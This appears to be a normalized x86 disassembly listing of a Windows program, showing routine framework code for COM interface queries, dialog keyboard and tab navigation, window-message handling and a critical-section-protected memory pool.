mov ecx [ eax + 0x88 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x88 ]
mov eax [ ecx ]
call [ eax ]
pop esi
retn
xor eax eax
pop esi
retn
sub_40a65c
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
mov ecx [ ecx + 0x8c ]
and [ eax ] 0x0
xor eax eax
retn 0xc
mov eax [ ecx + 0x8 ]
cmp eax [ esp + 0x4 ]
je r-xdata
call sub_40a626
mov ecx [ esp + 0x8 ]
mov [ ecx ] eax
call sub_40a59f
mov ecx eax
jmp r-xdata
test ecx ecx
je r-xdata
sub_40a6ef
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_40ccd0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
push eax
mov [ ecx ] eax
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_40ccd0
add esp 0xc
test eax eax
je r-xdata
mov eax 0x80004002
jmp r-xdata
retn 0xc
sub_40a739
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
push 0x1
push esi
push [ ebp + 0x10 ]
mov ecx edi
push [ ebp + 0xc ]
call sub_40a8f6
test eax eax
jl r-xdata
pop edi
pop esi
pop ebp
retn 0x10
mov esi [ esi ]
cmp esi 0x1e
je r-xdata
xor eax eax
cmp esi 0x2
je r-xdata
cmp esi 0x3
je r-xdata
mov eax [ ebp + 0xc ]
and eax 0x1
jne r-xdata
mov ecx [ edi - 0x4c ]
test ecx ecx
je r-xdata
cmp esi 0x1
je r-xdata
test eax eax
je r-xdata
cmp esi 0x14
jne r-xdata
mov eax [ ecx ]
call [ eax + 0x14 ]
jmp r-xdata
sub_40a7b5
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
push 0x3
push esi
push [ ebp + 0x10 ]
mov ecx edi
push [ ebp + 0xc ]
call sub_40a8f6
test eax eax
jl r-xdata
pop edi
pop esi
pop ebp
retn 0x10
mov esi [ esi ]
cmp esi 0x2
je r-xdata
mov ecx [ edi - 0x4c ]
test ecx ecx
je r-xdata
cmp esi 0x3
je r-xdata
xor eax eax
test [ ebp + 0xc ] 0x80
je r-xdata
cmp esi 0x14
jne r-xdata
mov eax [ ecx ]
call [ eax + 0x14 ]
sub_40a83f
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
push 0x6
push esi
push [ ebp + 0x10 ]
mov ecx edi
push [ ebp + 0xc ]
call sub_40a8f6
test eax eax
jl r-xdata
pop edi
pop esi
pop ebp
retn 0x10
mov eax [ esi ]
mov esi [ edi - 0x4c ]
test esi esi
je r-xdata
xor eax eax
cmp [ esi + 0x44 ] 0x0
jne r-xdata
cmp eax 0x1f
je r-xdata
cmp eax 0x1e
je r-xdata
test [ ebp + 0xc ] 0x3
je r-xdata
cmp eax 0x2
je r-xdata
cmp eax 0x3
je r-xdata
mov ecx esi
mov [ esi + 0x44 ] 0x1
call sub_40907f
mov eax [ esi ]
and [ esi + 0x44 ] 0x0
mov ecx esi
call [ eax + 0x10 ]
sub_40a8a8
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push 0x7
mov ecx esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40a8f6
test eax eax
jl r-xdata
pop esi
pop ebp
retn 0x10
mov esi [ esi - 0x4c ]
test esi esi
je r-xdata
xor eax eax
test [ ebp + 0xc ] 0x80
je r-xdata
push edi
mov edi [ esi + 0x44 ]
mov ecx esi
mov [ esi + 0x44 ] 0x1
call sub_40907f
mov eax [ esi ]
mov ecx esi
mov [ esi + 0x44 ] edi
call [ eax + 0x10 ]
pop edi
sub_40a8f6
push ebp
mov ebp esp
sub esp 0x24
test [ ebp + 0x8 ] 0x3
push esi
push edi
lea edi [ ecx - 0xd4 ]
je r-xdata
xor eax eax
xor edx edx
cmp [ ebp + 0xc ] edx
jbe r-xdata
mov ecx [ ebp + 0x10 ]
inc edx
add ecx 0x24
cmp edx [ ebp + 0xc ]
jae r-xdata
movzx eax [ eax + lookup_table_40a99b ]
jmp [ eax * 4 + jump_table_40a97b ]
jmp r-xdata
push 0x1
jmp r-xdata
push 0x7
jmp r-xdata
push 0x5
jmp r-xdata
push 0x4
jmp r-xdata
push 0x6
jmp r-xdata
push 0x3
jmp r-xdata
push 0x2
mov eax [ ecx ]
dec eax
cmp eax 0x1e
ja r-xdata
pop esi
lea ecx [ ebp - 0x24 ]
push 0x3
call sub_40ac6c
mov eax [ ebp + 0x14 ]
mov ecx edi
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x4 ] esi
call sub_406f2e
mov eax [ ebp - 0xc ]
jmp r-xdata
pop edi
pop esi
leave
retn 0x10
sub_40a9a3
add al [ edx ]
add eax [ ebx ]
pop es
pop es
add eax [ ebx ]
pop es
pop es
add eax [ ecx ]
add eax [ edi ]
add al [ eax + 0x7070707 ]
pop es
push es
xor eax eax
retn 0x4
sub_40a9bf
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_40ccd0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
push eax
mov [ ecx ] eax
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_40ccd0
add esp 0xc
test eax eax
je r-xdata
mov eax 0x80004002
jmp r-xdata
retn 0xc
sub_40aa09
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
lea edi [ eax - 0xd8 ]
mov eax [ ebp + 0x20 ]
xor ebx ebx
sub eax ebx
je r-xdata
push 0x1
jmp r-xdata
dec eax
je r-xdata
pop ebx
jmp r-xdata
push 0x4
dec eax
je r-xdata
push 0x3
lea ecx [ ebp - 0x24 ]
call sub_40ac6c
lea eax [ ebp - 0x24 ]
mov ecx edi
push eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x6
call sub_406f2e
mov eax [ ebp - 0xc ]
push 0x6
jmp r-xdata
dec eax
je r-xdata
push 0x5
jmp r-xdata
dec eax
jne r-xdata
mov esi [ edi + 0x88 ]
push 0x7
test esi esi
pop ebx
jne r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx esi
mov [ esi + 0x44 ] 0x1
call sub_40907f
mov eax [ esi ]
and [ esi + 0x44 ] 0x0
mov ecx esi
call [ eax + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn 0x20
sub_40aa9a
push ebp
mov ebp esp
sub esp 0x28
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x7
lea esi [ eax - 0xd8 ]
mov eax [ ebp + 0x1c ]
pop edi
xor ebx ebx
push 0x4
sub eax ebx
mov [ ebp - 0x4 ] esi
mov [ ebp + 0x8 ] ebx
pop edx
je r-xdata
mov [ ebp + 0x8 ] 0x1
dec eax
je r-xdata
mov ebx edi
sub eax ecx
je r-xdata
mov [ ebp + 0x8 ] edx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
cmp ebx ecx
jne r-xdata
push 0x3
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x18 ]
push 0x2
sub eax edx
pop ecx
je r-xdata
mov [ ebp + 0x8 ] 0x6
jmp r-xdata
dec eax
je r-xdata
cmp ebx edi
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
pop ebx
jmp r-xdata
push 0x5
sub eax 0x5
jne r-xdata
mov [ ebp + 0x8 ] 0x5
jmp r-xdata
dec eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x6
jne r-xdata
cmp [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x14 ]
jmp r-xdata
mov esi [ esi + 0x88 ]
test esi esi
je r-xdata
mov ebx ecx
jmp r-xdata
mov [ ebp + 0x8 ] edi
jmp r-xdata
test ebx ebx
je r-xdata
cmp ebx 0x5
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x14 ]
mov ecx [ ebp + 0x14 ]
mov eax [ esi + 0x50 ]
mov ecx [ ecx ]
mov [ eax + 0xc ] ecx
mov edi [ esi + 0x44 ]
mov ecx esi
mov [ esi + 0x44 ] 0x1
call sub_40907f
test edi edi
mov [ esi + 0x44 ] edi
jne r-xdata
push 0x3
lea ecx [ ebp - 0x28 ]
call sub_40ac6c
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x28 ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_406f2e
mov eax [ ebp - 0x10 ]
test eax eax
jl r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn 0x1c
sub_40abaf
cmp [ esp + 0xc ] 0xe
push esi
jne r-xdata
xor eax eax
pop esi
retn 0x14
mov eax [ esp + 0x8 ]
mov esi [ eax - 0x50 ]
test esi esi
je r-xdata
mov eax [ esi + 0x50 ]
mov ecx [ esi + 0x54 ]
push [ eax ]
call sub_4080fd
mov ecx [ esi + 0x54 ]
call sub_40821e
mov eax [ esi + 0x50 ]
mov ecx [ esi + 0x54 ]
push [ eax ]
call sub_4088bc
mov eax [ esi + 0x54 ]
mov eax [ eax + 0xc ]
cmp [ esi + 0x10 ] eax
je r-xdata
push [ esi + 0x14 ]
mov [ esi + 0x10 ] eax
call [ CoTaskMemFree@IAT ]
mov eax [ esi + 0x10 ]
lea eax [ eax + eax * 4 ]
shl eax 0x3
push eax
call [ CoTaskMemAlloc@IAT ]
mov [ esi + 0x14 ] eax
mov esi [ esi + 0x10 ]
lea ecx [ esi + esi * 4 ]
shl ecx 0x3
push ecx
push 0x0
push eax
call sub_40cc70
add esp 0xc
sub_40ac36
push esi
push edi
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
mov esi [ esp + 0xc ]
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ edi ]
push edi
call [ eax + 0x4 ]
mov [ esi ] edi
mov eax edi
pop edi
pop esi
retn 0x8
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40ac9e
mov edx [ esp + 0x4 ]
test edx edx
jne r-xdata
mov ecx [ esp + 0x8 ]
test ecx ecx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ecx + 0x8 ]
xor eax eax
jmp r-xdata
retn 0x8
push ecx
push eax
push 0x87
push [ edx + 0x1c ]
call [ SendMessageA@IAT ]
sub_40accc
push esi
mov esi [ esp + 0x8 ]
push 0x0
push esi
call sub_40ac9e
test al 0x8
je r-xdata
mov ecx esi
call sub_41f33b
pop esi
retn 0x4
push 0xffffffff
push 0x0
push 0xb1
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
sub_40acfa
push ebx
push esi
mov esi [ esp + 0x10 ]
xor ebx ebx
test esi esi
push edi
je r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
retn 0x8
mov edi [ GetWindowLongA@IAT ]
cmp esi [ esp + 0x10 ]
je r-xdata
push [ esi + 0x1c ]
mov ebx esi
call [ GetParent@IAT ]
push eax
call sub_41cbcb
mov esi eax
push 0xffffffec
push [ esi + 0x1c ]
call edi
test eax 0x10000
jne r-xdata
test esi esi
jne r-xdata
push 0xfffffff0
push [ esi + 0x1c ]
call edi
and eax 0xc0000000
cmp eax 0x40000000
jne r-xdata
sub_40ad53
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
test esi esi
je r-xdata
mov ebp [ esp + 0x10 ]
mov eax [ esi + 0x1c ]
mov edi [ GetWindow@IAT ]
push 0x2
push eax
call edi
push eax
call sub_41cbcb
test eax eax
mov ebp [ esp + 0x10 ]
jne r-xdata
push ebx
push 0xffffffec
push [ esi + 0x1c ]
call [ GetWindowLongA@IAT ]
test eax 0x10000
je r-xdata
mov eax ebp
jmp r-xdata
mov esi [ esi + 0x1c ]
push 0x2
push esi
call edi
push eax
call sub_41cbcb
mov esi eax
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_41cbcb
push eax
push ebp
call sub_40acfa
mov esi eax
test esi esi
je r-xdata
mov eax esi
pop ebx
mov ebx [ esp + 0x1c ]
test bl 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn 0xc
push [ ebp + 0x1c ]
call [ GetTopWindow@IAT ]
push eax
call sub_41cbcb
mov esi eax
test esi esi
jne r-xdata
cmp esi ebp
je r-xdata
test bl 0x2
je r-xdata
push [ esi + 0x1c ]
call [ IsWindowVisible@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
push 0x2
push eax
call edi
push eax
call sub_41cbcb
test eax eax
je r-xdata
push ebx
push 0x0
push esi
mov ecx esi
call sub_41f2f9
test eax eax
jne r-xdata
push ebx
push esi
push ebp
jmp r-xdata
call sub_40ad53
mov esi eax
sub_40ae2f
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x38 ]
test ecx ecx
je r-xdata
xor eax eax
retn
push [ esp + 0x8 ]
call sub_406d82
test eax eax
je r-xdata
push 0x1
pop eax
retn
sub_40ae4e
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
xor ebx ebx
push edi
call sub_40acfa
mov esi eax
push 0x0
push esi
push [ edi + 0x1c ]
call [ GetNextDlgGroupItem@IAT ]
push eax
call sub_41cbcb
mov esi eax
test esi esi
je r-xdata
mov esi [ esi + 0x1c ]
push [ ebp + 0xc ]
push edi
call sub_40acfa
mov ebx eax
mov esi ebx
inc ebx
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
cmp esi ebx
jne r-xdata
cmp ebx 0x3c
jg r-xdata
push 0x3
push esi
push edi
call sub_40ad53
push [ ebp + 0x10 ]
mov esi eax
push esi
call sub_40ae2f
pop ecx
test eax eax
pop ecx
jne r-xdata
jmp r-xdata
push [ ebp + 0x10 ]
push esi
call sub_40ae2f
pop ecx
test eax eax
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
test esi esi
je r-xdata
sub_40aed3
push esi
mov esi [ esp + 0x8 ]
mov ecx esi
call sub_41f2f9
test eax eax
je r-xdata
xor eax eax
pop esi
retn
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
test [ eax + 0x71 ] 0x20
je r-xdata
push 0x1
pop eax
pop esi
retn
sub_40aef9
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ebx
xor eax eax
push esi
call sub_40aed3
test eax eax
pop ecx
je r-xdata
mov ecx esi
call sub_41f2f9
test eax eax
jne r-xdata
push 0x0
push [ esi + 0x1c ]
push [ edi + 0x1c ]
call [ GetNextDlgTabItem@IAT ]
push eax
call sub_41cbcb
mov esi eax
test esi esi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
test ebx ebx
jne r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x200
jl r-xdata
mov ebx esi
push [ ebp + 0x10 ]
push esi
push edi
call sub_40ae4e
mov esi eax
test esi esi
je r-xdata
sub_40af6e
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
xor esi esi
test eax eax
je r-xdata
mov esi [ eax + 0x38 ]
test esi esi
jne r-xdata
test edi edi
jne r-xdata
push [ eax + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_41cbcb
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xac ]
call [ GetFocus@IAT ]
push eax
call sub_41cbcb
cmp eax ebx
je r-xdata
mov edi [ eax + 0x34 ]
test edi edi
jne r-xdata
mov ecx ebx
call sub_41f33b
sub_40afcb
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
je r-xdata
pop edi
pop esi
retn
push [ esi + 0x1c ]
call [ IsWindow@IAT ]
test eax eax
je r-xdata
push [ esi + 0x1c ]
mov esi [ GetParent@IAT ]
mov edi [ eax + 0x34 ]
test edi edi
jne r-xdata
mov eax [ edi + 0x48 ]
test eax eax
je r-xdata
push [ eax + 0x1c ]
jmp r-xdata
push [ eax + 0x20 ]
call sub_41cbcb
test eax eax
je r-xdata
call esi
push eax
call sub_41cbcb
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
cmp ecx eax
je r-xdata
test ecx ecx
je r-xdata
mov eax [ edi ]
push 0x0
mov ecx edi
call [ eax + 0x5c ]
push [ ecx + 0x1c ]
push [ eax + 0x1c ]
call [ IsChild@IAT ]
test eax eax
jne r-xdata
sub_40b03e
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
push [ esp + 0x14 ]
mov ecx ebx
call sub_41f140
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x8
push 0x1
push eax
push ebx
call sub_40ad53
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
mov esi edi
mov ecx edi
mov eax esi
jmp r-xdata
push 0x1
push esi
push ebx
call sub_40ad53
mov esi eax
test esi esi
je r-xdata
cmp esi edi
je r-xdata
mov ecx esi
jmp r-xdata
call sub_41f227
cmp eax [ esp + 0x14 ]
je r-xdata
sub_40b095
push esi
mov esi [ esp + 0x8 ]
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
push 0x0
push esi
call sub_40ac9e
mov ecx [ esp + 0xc ]
neg ecx
sbb ecx ecx
and ecx 0x10
add ecx 0x10
test ecx eax
je r-xdata
push [ esp + 0xc ]
call sub_406aa4
pop esi
retn
pop esi
retn
xor eax eax
push 0x1
cmp [ esp + 0x10 ] eax
setne al
push eax
push 0xf4
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
sub_40b0e2
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ eax + 0x38 ]
test ecx ecx
je r-xdata
retn
push 0x0
push eax
call sub_40ac9e
and eax 0x30
retn
jmp sub_406a8c
sub_40b103
push esi
mov esi [ esp + 0xc ]
test esi esi
push edi
je r-xdata
push 0x3
push 0x0
push [ esp + 0x14 ]
call sub_40ad53
push 0xffffffec
push [ esi + 0x1c ]
call [ GetWindowLongA@IAT ]
test eax 0x10000
jne r-xdata
pop edi
pop esi
retn 0x8
mov esi edi
push esi
push [ esp + 0x10 ]
call sub_40acfa
jmp r-xdata
cmp esi edi
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push 0x0
push esi
call sub_40b095
pop ecx
pop ecx
push 0x0
push esi
push [ esp + 0x14 ]
call sub_40ad53
mov esi eax
test esi esi
je r-xdata
sub_40b165
mov eax [ esp + 0x4 ]
push 0x0
push 0x0
push 0x400
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
mov ecx eax
shr ecx 0x10
cmp cx 0x534b
jne r-xdata
push 0x1
pop eax
movzx eax ax
jmp r-xdata
retn 0x4
sub_40b192
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
test edi edi
jne r-xdata
mov eax [ edi + 0x1c ]
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
test edi edi
je r-xdata
mov ebx [ ebp + 0x8 ]
push eax
push [ ebx + 0x1c ]
call [ IsChild@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax edi
jne r-xdata
push 0xffffffec
push [ edi + 0x1c ]
call [ GetWindowLongA@IAT ]
test eax 0x10000
jne r-xdata
test eax eax
je r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
push edi
call sub_40b0e2
pop ecx
mov [ ebp - 0x4 ] eax
test edi edi
je r-xdata
push eax
call sub_40b0e2
test eax eax
pop ecx
jne r-xdata
test eax eax
je r-xdata
test [ ebp - 0x4 ] 0x30
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push edi
push 0x1
push edi
jmp r-xdata
push ebx
call sub_40b165
push eax
push ebx
call sub_40b03e
mov esi eax
test esi esi
je r-xdata
push ebx
call sub_40b165
push eax
push ebx
call sub_40b03e
mov esi eax
push esi
call sub_40b0e2
test al 0x20
pop ecx
je r-xdata
call sub_40b095
pop ecx
pop ecx
cmp esi edi
je r-xdata
mov ecx esi
call sub_41f2f9
test eax eax
je r-xdata
push esi
call sub_40b0e2
test al 0x10
pop ecx
je r-xdata
push 0x1
push esi
push esi
jmp r-xdata
push ebx
call sub_40b103
sub_40b27f
mov eax sub_426578
call sub_40cc20
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call [ GetFocus@IAT ]
push eax
call sub_41cbcb
test eax eax
mov [ ebp - 0x14 ] eax
jne r-xdata
mov ecx [ eax + 0x1c ]
mov [ ebp - 0x20 ] ecx
and [ ebp - 0x20 ] eax
jmp r-xdata
mov ecx [ ecx + 0x1c ]
mov [ ebp - 0x24 ] ecx
and [ ebp - 0x24 ] ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
cmp ebx 0x200
jb r-xdata
cmp ebx 0x108
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov ebx [ ecx + 0x4 ]
cmp ebx 0x100
mov [ ebp - 0x18 ] ebx
jb r-xdata
mov eax [ ebp + 0xc ]
push [ eax ]
call sub_41cbcb
mov edi eax
mov eax [ ebp - 0x18 ]
xor esi esi
push 0x2
sub eax 0x100
mov [ ebp - 0x1c ] esi
pop ebx
je r-xdata
cmp ebx 0x209
ja r-xdata
test eax eax
mov esi eax
je r-xdata
push [ ebp + 0xc ]
push edi
call sub_40ac9e
mov ecx [ ebp + 0xc ]
movzx ecx [ ecx + 0x8 ]
cmp ecx 0x1b
jg r-xdata
sub eax ebx
je r-xdata
cmp ebx 0x101
je r-xdata
mov edi [ GetParent@IAT ]
cmp ecx 0x25
jl r-xdata
je r-xdata
mov esi [ ebp + 0xc ]
sub eax 0x4
jne r-xdata
test esi esi
je r-xdata
cmp ebx 0x100
je r-xdata
test esi esi
je r-xdata
push [ esi + 0x1c ]
call edi
push eax
call sub_41cbcb
cmp eax [ ebp + 0x8 ]
je r-xdata
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x1c ]
call [ IsDialogMessageA@IAT ]
mov edi eax
test edi edi
je r-xdata
cmp ecx 0x26
jle r-xdata
push ebx
push [ ebp + 0x8 ]
call sub_40b03e
mov esi eax
test esi esi
je r-xdata
cmp ecx 0x3
je r-xdata
push 0x1
pop eax
jmp r-xdata
push esi
push edi
call sub_40ac9e
cmp [ ebp - 0x18 ] 0x102
jne r-xdata
cmp [ ebp - 0x14 ] esi
jne r-xdata
mov esi [ esi + 0x38 ]
test esi esi
je r-xdata
cmp ebx 0x102
jne r-xdata
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
push [ esi + 0x1c ]
call edi
push eax
call sub_41cbcb
mov esi eax
test esi esi
jne r-xdata
push [ ebp - 0x20 ]
mov esi [ IsWindow@IAT ]
call esi
test eax eax
je r-xdata
mov esi [ GetFocus@IAT ]
call esi
push eax
call sub_41cbcb
cmp eax [ ebp - 0x14 ]
je r-xdata
mov [ ebp - 0x1c ] 0x1
cmp ecx 0x28
jle r-xdata
mov ecx esi
call sub_41f2f9
test eax eax
jne r-xdata
cmp ecx 0x9
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x8
mov cx [ esi + 0x8 ]
cmp cx 0x9
jne r-xdata
test al 0x84
jne r-xdata
mov esi [ ebp + 0xc ]
cmp [ esi + 0x8 ] 0x20
je r-xdata
push 0x12
call [ GetKeyState@IAT ]
test ax ax
jge r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x8 ]
cmp ax 0xd
jne r-xdata
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
cmp [ esi + 0x38 ] 0x0
jne r-xdata
mov eax edi
mov ebx [ GetFocus@IAT ]
call ebx
push eax
call sub_41cbcb
push eax
push [ ebp - 0x14 ]
call sub_40afcb
pop ecx
pop ecx
push [ ebp - 0x24 ]
call esi
test eax eax
je r-xdata
call esi
push eax
call sub_41cbcb
push eax
call sub_40af6e
pop ecx
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
push [ ebp - 0x14 ]
call sub_40ac9e
test al 0x1
jne r-xdata
cmp ecx 0x2b
jne r-xdata
cmp [ esi + 0x38 ] 0x0
je r-xdata
push eax
call [ MessageBeep@IAT ]
jmp r-xdata
test al 0x2
jne r-xdata
cmp ecx 0xd
je r-xdata
cmp cx 0x20
jne r-xdata
test bl al
jne r-xdata
jmp r-xdata
cmp ax 0x1b
jne r-xdata
test [ esi + 0x80 ] 0x1
jne r-xdata
push [ ebp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
test eax eax
je r-xdata
call ebx
push eax
call sub_41cbcb
push eax
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_40b192
push [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x1c ]
call [ GetNextDlgGroupItem@IAT ]
push eax
call sub_41cbcb
test eax eax
je r-xdata
mov eax [ eax + 0x1c ]
push [ ebp - 0x14 ]
call sub_40b0e2
test al 0x10
pop ecx
je r-xdata
xor eax eax
push eax
push eax
push eax
push 0x1
push 0xfffffdd9
push esi
mov [ ebp - 0x4 ] eax
call sub_41f35c
add esp 0x18
or [ ebp - 0x4 ] 0xffffffff
push 0x10
call [ GetKeyState@IAT ]
xor ecx ecx
test ax ax
setl cl
test edi edi
mov eax ecx
je r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_40aef9
test eax eax
je r-xdata
cmp edi [ ebp + 0x8 ]
je r-xdata
test [ esi + 0x80 ] 0x2
je r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x38 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
call sub_40b165
mov esi [ ebp - 0x14 ]
mov ecx esi
call sub_41f227
jmp r-xdata
push eax
mov eax [ ebp + 0x8 ]
push edi
push [ eax + 0x1c ]
call [ GetNextDlgTabItem@IAT ]
push eax
call sub_41cbcb
mov esi eax
test esi esi
je r-xdata
mov edi [ edi + 0x1c ]
mov eax [ eax + 0x38 ]
test eax eax
je r-xdata
push eax
call sub_40accc
jmp r-xdata
test esi esi
mov ebx eax
jne r-xdata
push 0x1
pop edi
jmp r-xdata
push esi
call sub_40accc
push esi
push [ ebp - 0x14 ]
call sub_40afcb
pop ecx
pop ecx
jmp r-xdata
push esi
mov ecx eax
call sub_406e25
jmp r-xdata
sub_40b66a
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
and [ esi + 0xc ] 0x0
and [ esi + 0x8 ] 0x0
mov [ esi ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x4 ] eax
lea eax [ esi + 0x10 ]
push eax
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn 0x8
sub_40b6a6
push esi
mov esi ecx
push edi
lea edi [ esi + 0x10 ]
push edi
call [ EnterCriticalSection@IAT ]
mov ecx [ esi + 0x8 ]
call sub_41a8db
and [ esi + 0x8 ] 0x0
and [ esi + 0xc ] 0x0
push edi
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
retn
sub_40b6ce
mov eax sub_426584
call sub_40cc20
sub esp 0xc
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
lea ebx [ esi + 0x10 ]
push ebx
call [ EnterCriticalSection@IAT ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov edi [ esi + 0xc ]
push ebx
mov eax [ edi ]
mov [ esi + 0xc ] eax
call [ LeaveCriticalSection@IAT ]
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
push [ esi ]
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x8 ]
push [ esi + 0x4 ]
push eax
call sub_41a8bb
mov ecx [ esi + 0x4 ]
dec ecx
mov edx ecx
imul edx [ esi ]
test ecx ecx
lea eax [ edx + eax + 0x4 ]
jl r-xdata
inc ecx
mov edx [ esi + 0xc ]
mov [ eax ] edx
mov [ esi + 0xc ] eax
sub eax [ esi ]
dec ecx
jne r-xdata
sub_40b75d
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
je r-xdata
pop edi
pop esi
retn 0x4
push ebx
lea ebx [ esi + 0x10 ]
push ebx
call [ EnterCriticalSection@IAT ]
mov eax [ esi + 0xc ]
push ebx
mov [ edi ] eax
mov [ esi + 0xc ] edi
call [ LeaveCriticalSection@IAT ]
pop ebx
sub_40b810
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
and [ edi + 0x8 ] 0x0
mov [ edi ] 0x8
test esi esi
je r-xdata
lea esp [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebp + 0xc ] 0xe
push esi
jne r-xdata
call [ lstrlenA@IAT ]
mov esi eax
inc esi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_40c4f0
mov ebx esp
push esi
